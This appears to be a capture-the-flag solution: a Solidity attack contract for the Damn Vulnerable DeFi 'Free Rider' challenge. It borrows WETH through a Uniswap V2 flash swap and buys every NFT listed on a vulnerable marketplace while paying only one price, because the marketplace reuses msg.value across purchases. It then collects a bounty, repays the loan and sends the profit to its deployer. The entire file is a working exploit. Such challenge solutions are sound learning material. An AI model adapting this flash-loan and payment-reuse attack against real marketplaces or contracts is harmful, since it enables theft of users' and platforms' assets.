// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FreeRiderNFTMarketplace} from "../free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function withdraw(uint256) external;
    function balanceOf(address account) external returns (uint256);
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IFreeRiderNFTMarketplace {
    function token() external returns (DamnValuableNFT);
    function offersCount() external returns (uint256);
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderNFTMarketplaceAttack is IUniswapV2Callee, IERC721Receiver {
    error FreeRiderNFTMarketplaceAttack__LenderUnknown();
    error FreeRiderNFTMarketplaceAttack__NftUnknown();
    error FreeRiderNFTMarketplaceAttack__InitiatorUnknown();
    error FreeRiderNFTMarketplaceAttack__MissingEthBounty();
    error FreeRiderNFTMarketplaceAttack__MissingEth();

    IFreeRiderNFTMarketplace private immutable i_victimeMarket;
    IUniswapV2Pair private immutable i_uniswapExchange;
    IWETH private immutable i_weth;
    address private immutable i_bounty;
    address private immutable i_owner;

    constructor(address _victimeMarket, address _uniswapExchange, address _bounty) {
        i_owner = msg.sender;
        i_victimeMarket = IFreeRiderNFTMarketplace(_victimeMarket);

        i_uniswapExchange = IUniswapV2Pair(_uniswapExchange);
        i_weth = IWETH(i_uniswapExchange.token0());

        i_bounty = _bounty;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256, bytes calldata) external {
        if (msg.sender != address(i_uniswapExchange)) {
            revert FreeRiderNFTMarketplaceAttack__LenderUnknown();
        }

        if (sender != address(this)) {
            revert FreeRiderNFTMarketplaceAttack__InitiatorUnknown();
        }

        // Convert attacker's WETH to ETH
        i_weth.withdraw(amount0);
        // Buy NFT (for free)
        uint256 numberOfOffers = i_victimeMarket.offersCount();
        uint256[] memory tokenIds = new uint256[](numberOfOffers);
        for (uint256 i = 0; i < numberOfOffers; ++i) {
            tokenIds[i] = i;
        }
        i_victimeMarket.buyMany{value: amount0}(tokenIds);

        // Get Bounty
        uint256 currentBalance = address(this).balance;
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            i_victimeMarket.token().safeTransferFrom(address(this), i_bounty, i, abi.encode(address(this)));
            if ((i == tokenIds.length - 1) && address(this).balance <= currentBalance) {
                revert FreeRiderNFTMarketplaceAttack__MissingEthBounty();
            }
        }

        uint256 flashLoanFees = (amount0 * 4) / 1000; // Uniswap requires 0.3% fees
        uint256 amountToSendBack = amount0 + flashLoanFees;
        // convert the borrowed WETH + fees to ETH
        i_weth.deposit{value: amountToSendBack}();
        // Send back the borrowed WETH + fees
        i_weth.transfer(address(i_uniswapExchange), amountToSendBack);
    }

    function launchAttack(uint256 tokenPrice) external payable {
        // Player pays for gas :)
        if (msg.value == 0) {
            revert FreeRiderNFTMarketplaceAttack__MissingEth();
        }

        // Flash loan WETH through UniswapV2Pair
        i_uniswapExchange.swap(tokenPrice, 0, address(this), "0x");

        // Send ETH to player
        (bool success,) = payable(address(i_owner)).call{value: address(this).balance}("");
        if (!success) {
            revert();
        }
    }

    function onERC721Received(address initiator, address, uint256, bytes memory) external override returns (bytes4) {
        if (msg.sender != address(i_victimeMarket.token())) {
            revert FreeRiderNFTMarketplaceAttack__NftUnknown();
        }

        if (initiator != address(i_victimeMarket)) {
            revert FreeRiderNFTMarketplaceAttack__InitiatorUnknown();
        }

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
